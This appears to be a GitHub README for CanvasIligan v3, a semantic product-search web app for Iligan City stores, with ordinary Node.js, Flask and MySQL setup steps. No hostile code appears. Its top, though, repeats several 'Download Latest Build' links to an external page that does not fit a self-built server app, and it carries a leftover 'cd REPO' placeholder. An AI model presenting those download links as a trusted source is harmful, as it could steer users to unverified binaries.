# CanvasIligan v3 - Semantic Product Search Web Application 2026

> **CanvasIligan is a browser-based product discovery platform that pairs natural-language semantic search with pricing, availability, and store details for items sold in Iligan City.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v3-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bergerlouis70/canvasiligan-semantic-product-hub?style=flat-square)](https://github.com/bergerlouis70/canvasiligan-semantic-product-hub)

---

<p align="center">
  <a href="https://bergerlouis70.github.io/canvasiligan-semantic-product-hub/">
    <img src="https://img.shields.io/badge/Download-CanvasIligan%20Latest-brightgreen?style=for-the-badge" alt="Download CanvasIligan">
  </a>
</p>

> **[Download Latest Build - CanvasIligan v3](https://bergerlouis70.github.io/canvasiligan-semantic-product-hub/)**

---

[Download](https://bergerlouis70.github.io/canvasiligan-semantic-product-hub/)

---

## What CanvasIligan Does

Instead of forcing shoppers to guess exact keywords, CanvasIligan lets them describe what they want in everyday language. Behind the scenes, a machine-learning search service built on sentence transformers and Faiss interprets each query, and keyword boosting can sharpen relevance whenever particular terms carry weight.

Product listings from several stores are aggregated into a single searchable experience. Availability, price ranges, store profiles, categories, and per-product pages are all reachable from the results, which makes the tool handy both for ordinary shopping and for project-style searches such as putting together a starter kit.

---

## Highlights

- Query products by describing them in plain language.
- Blend semantic similarity with keyword boosting to surface stronger matches.
- Give project-based starter kits preferred placement in results.
- See whether a product is available across multiple stores.
- View indicative price ranges for products.
- Drill into store profiles and dedicated product pages.
- Narrow results by category on the server side.
- Move through result sets with pagination.
- Run on a Node.js and Express backend.
- Talk to a Python Flask machine-learning service.
- Fall back to offline SVG placeholders when product imagery is missing.
- Enforce CSP, CORS, and API rate-limiting protections.

---

## Installation

The stack is split across three parts: Node.js hosts the main web application, Python powers the machine-learning service, and MySQL stores product and store records.

1. Fetch the repository:

   ```bash
   git clone https://github.com/bergerlouis70/canvasiligan-semantic-product-hub.git
   cd REPO
   ```

2. Pull in the Node.js packages:

   ```bash
   npm install
   ```

3. Set up and activate a Python virtual environment for the Flask service:

   ```bash
   python -m venv .venv
   ```

   On macOS or Linux:

   ```bash
   source .venv/bin/activate
   ```

   On Windows:

   ```powershell
   .venv\Scripts\Activate.ps1
   ```

4. If a dependency file ships with the project, install the Python service packages:

   ```bash
   pip install -r requirements.txt
   ```

5. Fill in the database and service variables described in the project configuration files.

6. Bring up the Node.js application and the Python Flask service using the scripts or entry points available in the project.

---

## Usage

A normal search session looks like this:

1. Bring up the MySQL database.
2. Start the Python Flask machine-learning service.
3. Launch the Node.js and Express backend.
4. Load the web application in a browser.
5. Describe what you need in natural language - a product description or a project requirement both work.
6. Trim the results with category filters and pagination.
7. Compare availability, price ranges, stores, and product details.

When searching for a project, spell out the starter kit or the set of items you have in mind so that result ordering can favor products that fit that project.

---

## Configuration

Keep environment-specific values in whatever configuration mechanism the project uses, such as a local `.env` file. Credentials and deployment-specific settings should never land in committed source files.

Settings typically include:

```env
NODE_ENV=development
PORT=3000
MYSQL_HOST=localhost
MYSQL_PORT=3306
MYSQL_DATABASE=canvasiligan
MYSQL_USER=your_user
MYSQL_PASSWORD=your_password
ML_SERVICE_URL=http://localhost:5000
```

Match the names your application source and deployment setup expect. Semantic search only works fully once the Node.js backend can reach both MySQL and the Flask machine-learning service.

---

## Requirements

- A current web browser.
- Node.js together with npm.
- Python with virtual-environment support.
- A running Python Flask service for machine-learning search.
- MySQL holding product, store, category, and availability data.
- Network reachability between the Node.js backend, the Flask service, and the MySQL instance.
- Disk space for application dependencies, sentence-transformer models, Faiss indexes, and project data.

---

## FAQ

### What is CanvasIligan for?

It is a web application that helps you locate products through semantic search and then inspect their availability, pricing, and store information.

### Do I have to type exact product names?

No. Queries in natural language are supported, and keyword boosting is there to strengthen matches when certain terms matter most.

### Why do some products not show up?

What appears depends on the product and store data loaded into the application. If expected items are missing, review the configured MySQL data and store records.

### How do I update the application?

Pull the newest repository changes, reinstall dependencies whenever package files change, check for configuration updates, then restart both the Node.js backend and the Flask machine-learning service.

### Where do configuration values belong?

Put local database, port, and machine-learning service settings in the project's environment or configuration files. Never commit private credentials.

### What should I check when semantic search fails?

Make sure the Flask service is running, that its endpoint matches the Node.js configuration, that the required sentence-transformer and Faiss resources are present, and that the backend can reach the service.

### Can it work without product images?

Yes. Offline SVG placeholders cover cases where product imagery is missing or unavailable.

---

## Roadmap

- Raise semantic ranking quality across more product categories.
- Extend project-based starter kit ordering.
- Strengthen multi-store availability and comparison views.
- Polish search filters and result navigation.
- Keep improving service configuration and deployment workflows.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
